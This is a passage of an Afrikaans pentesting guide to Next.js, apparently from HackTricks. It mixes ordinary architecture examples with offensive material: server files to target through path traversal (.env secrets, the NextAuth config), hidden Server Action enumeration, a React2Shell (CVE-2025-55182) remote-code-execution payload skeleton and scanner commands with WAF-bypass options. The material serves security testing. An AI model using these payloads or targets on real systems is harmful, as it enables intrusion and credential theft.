- Wysig die `<html>` of `<body>`-tags.
- Voeg meta-tags of aangepaste skripte by.
- Integreer lettertipes van derdepartye.

**Voorbeeld:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Pasgemaakte Server (Opsioneel)

**Doel:** Alhoewel Next.js met 'n ingeboude bediener kom, kan jy 'n pasgemaakte bediener skep vir gevorderde gebruiksgevalle soos pasgemaakte roetes of integrasie met bestaande backend-dienste.

**Nota:** Om 'n pasgemaakte bediener te gebruik kan ontplooiingsopsies beperk, veral op platforme soos Vercel wat optimaliseer vir Next.js se ingeboude bediener.

**Voorbeeld:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Bykomende argitektoniese en veiligheidsoorwegings

### Omgewingsveranderlikes en konfigurasie

**Doel:** Bestuur sensitiewe inligting en konfigurasie-instellings buite die codebase.

**Beste praktyke:**

- **Gebruik `.env`-lêers:** Stoor veranderlikes soos API keys in `.env.local` (uitgesluit van version control).
- **Access Variables Securely:** Gebruik `process.env.VARIABLE_NAME` om omgewingsveranderlikes veilig te benader.
- **Never Expose Secrets on the Client:** Moet nooit Secrets aan die kliënt openbaar nie. Verseker dat sensitiewe veranderlikes slegs server-side gebruik word.

**Voorbeeld:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Let op:** Om veranderlikes slegs aan die server-side te beperk, verwyder hulle uit die `env`-object of voorvoeg `NEXT_PUBLIC_` om dit aan die kliënt bloot te stel.

### Nuttige server-artefakte om via LFI/download endpoints te teiken

As jy 'n path traversal of download API in 'n Next.js app vind, teiken saamgestelde artefakte wat server-side geheime en auth-logika leak:

- `.env` / `.env.local` vir sessiegeheime en provider-credentials.
- `.next/routes-manifest.json` en `.next/build-manifest.json` vir 'n volledige roete-lys.
- `.next/server/pages/api/auth/[...nextauth].js` om die saamgestelde NextAuth-konfigurasie te herstel (bevat dikwels fallback-wagwoorde wanneer `process.env` waardes nie geset is nie).
- `next.config.js` / `next.config.mjs` om rewrites, redirects en middleware-routing na te gaan.

### Verifikasie en Gemagtiging

**Benadering:**

- **Sessie-gebaseerde verifikasie:** Gebruik cookies om gebruikersessies te bestuur.
- **Token-gebaseerde verifikasie:** Implementeer JWTs vir staatlose verifikasie.
- **Derdeparty Verskaffers:** Integreer met OAuth-verskaffers (bv. Google, GitHub) deur biblioteke soos `next-auth` te gebruik.

**Sekuriteitspraktyke:**

- **Secure Cookies:** Stel die `HttpOnly`, `Secure`, en `SameSite` attributte.
- **Wagwoord-hashing:** Hash altyd wagwoorde voordat jy dit stoor.
- **Invoer-validasie:** Voorkom injection-aanvalle deur insette te valideer en te sanitiseer.

**Voorbeeld:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Prestasie-optimalisering

**Strategieë:**

- **Beeldoptimalisering:** Gebruik Next.js se `next/image`-component vir outomatiese beeldoptimalisering.
- **Kode-opsplitsing:** Benut dinamiese imports om kode te verdeel en die aanvanklike laaitye te verminder.
- **Caching:** Implementeer kasstrategieë vir API-antwoorde en statiese assets.
- **Luie laai:** Laai komponente of assets slegs wanneer hulle benodig word.

**Voorbeeld:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Enumeration (hash to function name via source maps)

Moderne Next.js gebruik “Server Actions” wat op die bediener uitgevoer word, maar vanaf die kliënt aangeroep word. In produksie is hierdie aanroepe ondoorgrondelik: alle POSTs gaan na 'n gemeenskaplike endpoint en word onderskei deur 'n build-spesifieke hash wat in die `Next-Action` header gestuur word. Voorbeeld:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
Wanneer `productionBrowserSourceMaps` geaktiveer is, bevat minified JS chunks oproepe na `createServerReference(...)` wat leak genoeg struktuur (plus geassosieerde source maps) om 'n mapping tussen die action hash en die oorspronklike funksienaam te herstel. Dit laat jou toe om hashes wat in `Next-Action` waargeneem word te vertaal na konkrete teikens soos `deleteUserAccount()` of `exportFinancialData()`.

### Extraction approach (regex on minified JS + optional source maps)

Soek afgelaaide JS chunks vir `createServerReference` en onttrek die hash en die funksie-/bron-simbool. Twee nuttige patrone:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Groep 1: server action hash (40+ hex chars)
- Groep 2: simbool of pad wat, wanneer 'n source map teenwoordig is, na die oorspronklike funksienaam opgelos kan word

As die script 'n source map adverteer (trailer-opmerking `//# sourceMappingURL=<...>.map`), haal dit af en los die simbool/pad op na die oorspronklike funksienaam.

### Praktiese werkvloei

- Passiewe ontdekking terwyl jy blaai: vang versoeke met `Next-Action` headers en JS chunk URLs.
- Haal die verwysde JS bundles en die gepaardgaande `*.map` lêers af (wanneer teenwoordig).
- Voer die regex hierbo uit om 'n hash↔name woordeboek te bou.
- Gebruik die woordeboek om toetsing te rig:
  - Naam-gedrewe triage (bv., `transferFunds`, `exportFinancialData`).
  - Volg dekking oor builds deur funksienaam (hashes roteer oor builds).

### Uitvoering van verborge aksies (sjabloon-gebaseerde versoek)

Neem 'n geldige POST wat in-proxy waargeneem is as 'n sjabloon en verruil die `Next-Action` waarde om 'n ander ontdekte aksie te beoog:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Speel 'n replay in Repeater af en toets authorization, input validation en business logic van andersins onbereikbare aksies.

### Burp automatisering

- NextjsServerActionAnalyzer (Burp extension) voer die bogenoemde in Burp uit:
- Deursoek proxy-geskiedenis vir JS-chunks, onttrek `createServerReference(...)` inskrywings, en ontleed source maps wanneer beskikbaar.
- Onderhou 'n deursoekbare hash↔function-name woordeboek en verwyder duplikate oor builds op grond van function name.
- Kan 'n geldige template POST opspoor en 'n gereed-om-te-stuur Repeater-oortjie oopmaak met die teiken-aksie se hash ingesit.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Notas en beperkings

- Vereis dat `productionBrowserSourceMaps` in produksie geaktiveer is om name uit bundles/source maps te herwin.
- Function-name disclosure is nie op sigself 'n kwetsbaarheid nie; gebruik dit om ontdekking te rig en toets die authorization van elke aksie.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Next.js App Router deployments wat Server Actions blootstel op `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** bevat 'n kritieke server-side prototype pollution tydens **Flight** chunk deserialisering. Deur `$` verwysings binne 'n Flight payload te konstruer, kan 'n aanvaller vanaf besoedelde prototypes na arbitrêre JavaScript-uitvoering spring en daarna na OS-opdraguitvoering binne die Node.js-proses.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Aanvalsketting in Flight chunks

1. **Prototype pollution primitive:** Stel `"then": "$1:__proto__:then"` sodat die resolver 'n `then` funksie op `Object.prototype` skryf. Enige gewone objek wat daarna verwerk word, word 'n thenable, wat die aanvaller toelaat om async control flow binne RSC-internals te beïnvloed.
2. **Rebinding to the global `Function` constructor:** Wys `_response._formData.get` na `"$1:constructor:constructor"`. Tydens resolusie verander `object.constructor` → `Object`, en `Object.constructor` → `Function`, sodat toekomstige aanroepe na `_formData.get()` eintlik `Function(...)` uitvoer.
3. **Code execution via `_prefix`:** Plaas JavaScript-bron in `_response._prefix`. Wanneer die besoedelde `_formData.get` aangeroep word, evalueer die framework `Function(_prefix)(...)`, sodat die ingespuite JS `require('child_process').exec()` of enige ander Node-primitive kan uitvoer.

#### Payload-skelet
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### Kaartlegging van React Server Function blootstelling

React Server Functions (RSF) is enige funksies wat die 'use server'; direktief insluit. Elke form action, mutation, or fetch helper wat aan een van daardie funksies gebind is, word 'n RSC Flight endpoint wat maklik attacker-supplied payloads kan deserialiseer. Nuttige recon-stappe afkomstig van React2Shell assessments:

- **Statiese inventaris:** kyk vir die direktief om te verstaan hoeveel RSFs deur die framework outomaties blootgestel word.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router defaults:** `create-next-app` aktiveer die App Router + `app/` directory standaard, wat stilweg elke route in 'n RSC-capable endpoint omskakel. App Router-bates soos `/_next/static/chunks/app/` of responsse wat Flight-chunks oor `text/x-component` stroom, is duidelike internet-sigbare vingerafdrukke.
- **Implicitly vulnerable RSC deployments:** React’s own advisory notes that apps shipping the RSC runtime can be exploitable **even without explicit RSFs**, so treat any build using `react-server-dom-*` 19.0.0–19.2.0 as suspect.
- **Other frameworks bundling RSC:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, etc. hergebruik dieselfde serializer en erf dieselfde remote attack surface totdat hulle gepatchte React builds inbou.

#### Version coverage (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **vulnerable** in 19.0.0, 19.1.0–19.1.1 and 19.2.0; **patched** in 19.0.1, 19.1.2 and 19.2.1 respectively.
- **Next.js stable:** App Router releases 15.0.0–16.0.6 embed the vulnerable RSC stack. Patch trains 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 include fixed deps, so any build below those versions is high-value.
- **Next.js canary:** `14.3.0-canary.77+` also ships the buggy runtime and currently lacks patched canary drops, making those fingerprints strong exploitation candidates.

#### Remote detection oracle

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) stuur 'n vervaardigde multipart Flight-aanvraag na kandidaat-paadjies en monitor die server-side gedrag:

- **Default mode** voer 'n deterministiese RCE payload uit (wiskunde-operasie weergegee via `X-Action-Redirect`) wat code-uitvoering bewys.
- **`--safe-check` mode** doelbewus vervorm die Flight-berig sodat gepatchte servers `200/400` terugstuur, terwyl vulnerable teikens `HTTP/500` antwoorde uitstuur wat die `E{"digest"` substring in die body bevat. Daardie `(500 + digest)` paar is tans die mees betroubare remote oracle wat deur verdedigers gepubliseer is.
- Ingeboude `--waf-bypass`, `--vercel-waf-bypass`, and `--windows` switches pas die payload-layout aan, voeg rommel vooraan, of ruil OS-opdragte om sodoende werklike Internet assets te ondersoek.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
## Verwysings

- [Pentesting Next.js Server Actions — ’n Burp-uitbreiding vir Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – Alles wat jy moet weet](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Previous (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)

{{#include ../../banners/hacktricks-training.md}}
